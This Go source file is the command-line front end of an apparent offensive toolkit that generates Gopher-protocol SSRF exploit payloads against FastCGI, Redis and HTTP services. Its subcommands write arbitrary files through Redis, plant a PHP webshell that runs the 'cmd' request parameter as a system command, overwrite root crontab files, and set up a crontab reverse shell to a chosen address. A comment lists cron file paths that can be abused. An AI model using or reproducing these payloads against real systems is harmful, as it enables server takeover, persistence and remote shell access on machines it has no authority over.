package cmd

import (
	"fmt"
	"net/url"
	"strings"

	"github.com/spf13/cobra"
	"github.com/virink/virzz/common"
	"github.com/virink/virzz/utils"
	"github.com/virink/virzz/web/gopher"
)

// gopherCmd
var gopherCmd = &cobra.Command{
	Use:   "gopher",
	Short: "Generate Gopher Exp",
}

// gopherFastCGICmd
var gopherFastCGICmd = &cobra.Command{
	Use:   "fastcgi [addr]",
	Short: "Gopher Exp FastCGI",
	Args:  cobra.MinimumNArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		addr := args[0]
		_, _, err := utils.ParseAddr(addr)
		if err != nil {
			return err
		}
		if filename == "" {
			filename = "/usr/share/php/PEAR.php"
		}
		r, err := gopher.ExpFastCGI(addr, command, filename, encode)
		if err != nil {
			return err
		}
		return common.Output(r)
	},
}

// gopherRedisCmd
var gopherRedisCmd = &cobra.Command{
	Use:   "redis",
	Short: "Gopher Exp Redis",
}

// gopherRedisWriteCmd
var gopherRedisWriteCmd = &cobra.Command{
	Use:   "write [addr]",
	Short: "Gopher Exp Redis Write Any File",
	Args:  cobra.MinimumNArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		addr := args[0]
		_, _, err := utils.ParseAddr(addr)
		if err != nil {
			return err
		}
		if filename == "" {
			filename = "virzz.txt"
		}
		if filePath == "" {
			filePath = "/var/www/html/"
		}
		if content == "" {
			content = "Hello world"
		}
		r, err := gopher.ExpRedisCmd(addr, filePath, filename, content)
		if err != nil {
			return err
		}
		return common.Output(r)
	},
}

// gopherRedisWebshellCmd
var gopherRedisWebshellCmd = &cobra.Command{
	Use:   "webshell [addr]",
	Short: "Gopher Exp Redis Write Webshell",
	Args:  cobra.MinimumNArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		addr := args[0]
		_, _, err := utils.ParseAddr(addr)
		if err != nil {
			return err
		}
		if filename == "" {
			filename = "virzz.php"
		}
		if filePath == "" {
			filePath = "/var/www/html/"
		}
		if content == "" {
			content = "\r\n<?php system($_GET['cmd']);?>\r\n"
		}
		r, err := gopher.ExpRedisCmd(addr, filePath, filename, content)
		if err != nil {
			return err
		}
		return common.Output(r)
	},
}

// gopherRedisReverseCmd
var gopherRedisReverseCmd = &cobra.Command{
	Use:   "revese [addr]",
	Short: "Gopher Exp Redis Write Crontab Revese Shell",
	Args:  cobra.MinimumNArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		addr := args[0]
		_, _, err := utils.ParseAddr(addr)
		if err != nil {
			return err
		}
		if filename == "" {
			filename = "root"
		}
		if filePath == "" {
			filePath = "/var/spool/cron/"
		}
		if reverseAddr == "" {
			return fmt.Errorf("must need Reverse Addr")
		}
		r, err := gopher.ExpRedisReverseShell(addr, filePath, filename, reverseAddr)
		if err != nil {
			return err
		}
		return common.Output(r)
	},
}

// gopherRedisCrontabCmd
var gopherRedisCrontabCmd = &cobra.Command{
	Use:   "cron [addr]",
	Short: "Gopher Exp Redis Write Crontab",
	Args:  cobra.MinimumNArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		addr := args[0]
		_, _, err := utils.ParseAddr(addr)
		if err != nil {
			return err
		}
		if filename == "" {
			filename = "root"
		}
		if filePath == "" {
			filePath = "/var/spool/cron/"
		}
		if content == "" {
			content = "id > /var/www/html/virzz.txt"
		}
		r, err := gopher.ExpRedisCmd(addr, filePath, filename, content)
		if err != nil {
			return err
		}
		return common.Output(r)
	},
}

func parseURLToHostAndURI(u string) (string, string, error) {
	if !strings.HasPrefix(u, "http") {
		u = "http://" + u
	}
	us, err := url.Parse(u)
	if err != nil {
		return "", "", err
	}
	host := us.Host
	if !strings.Contains(host, ":") {
		host = host + ":80"
	}
	return host, us.RequestURI(), nil
}

// gopherHTTPPostCmd
var gopherHTTPPostCmd = &cobra.Command{
	Use:   "post [url]",
	Short: "Gopher Exp HTTP POST",
	Args:  cobra.MinimumNArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		host, uri, err := parseURLToHostAndURI(args[0])
		if err != nil {
			return err
		}
		if len(datas) == 0 {
			return cmd.Help()
		}
		r, err := gopher.ExpHTTPPost(host, uri, datas)
		if err != nil {
			return err
		}
		if urlencode {
			r = url.QueryEscape(r)
		}
		return common.Output(r)
	},
}

// gopherHTTPUploadCmd
var gopherHTTPUploadCmd = &cobra.Command{
	Use:   "upload [url]",
	Short: "Gopher Exp HTTP Upload",
	Args:  cobra.MinimumNArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		host, uri, err := parseURLToHostAndURI(args[0])
		if err != nil {
			return err
		}
		if len(datas) == 0 {
			return cmd.Help()
		}
		r, err := gopher.ExpHTTPUpload(host, uri, datas)
		if err != nil {
			return err
		}
		if urlencode {
			r = url.QueryEscape(r)
		}
		return common.Output(r)
	},
}

var (
	command           string
	filename          string
	encode, urlencode bool

	filePath    string
	content     string
	reverseAddr string

	datas map[string]string
)

func init() {
	gopherCmd.PersistentFlags().BoolVarP(&urlencode, "urlencode", "u", false, "URL Encode")

	gopherFastCGICmd.Flags().BoolVarP(&encode, "encode", "e", false, "Double URL Encode")
	gopherFastCGICmd.Flags().StringVarP(&command, "command", "c", "id", "Command")
	gopherFastCGICmd.Flags().StringVarP(&filename, "filename", "f", "", "Delimiter")

	gopherRedisCmd.PersistentFlags().StringVarP(&filename, "filename", "f", "", "filename")
	gopherRedisCmd.PersistentFlags().StringVarP(&filePath, "filepath", "p", "", "file path")
	gopherRedisCmd.PersistentFlags().StringVarP(&content, "content", "c", "", "file content")

	/*
		Crontab
		可进行利用的cron有如下几个地方：
		- /etc/crontab
		- /etc/cron.d/*
		- centos系统下root用户的cron文件
			- /var/spool/cron/root
		- debian系统下root用户的cron文件
			- /var/spool/cron/crontabs/root
	*/

	gopherRedisReverseCmd.Flags().StringVarP(&reverseAddr, "reverse", "r", "", "Reverse Addr")

	gopherHTTPPostCmd.Flags().StringToStringVarP(&datas, "data", "d", datas, "post data")
	gopherHTTPUploadCmd.Flags().StringToStringVarP(&datas, "data", "d", datas, "post data/upload file")

	gopherRedisCmd.AddCommand(gopherRedisWriteCmd, gopherRedisWebshellCmd, gopherRedisCrontabCmd, gopherRedisReverseCmd)
	gopherCmd.AddCommand(gopherFastCGICmd, gopherRedisCmd, gopherHTTPPostCmd, gopherHTTPUploadCmd)
	rootCmd.AddCommand(gopherCmd)
}
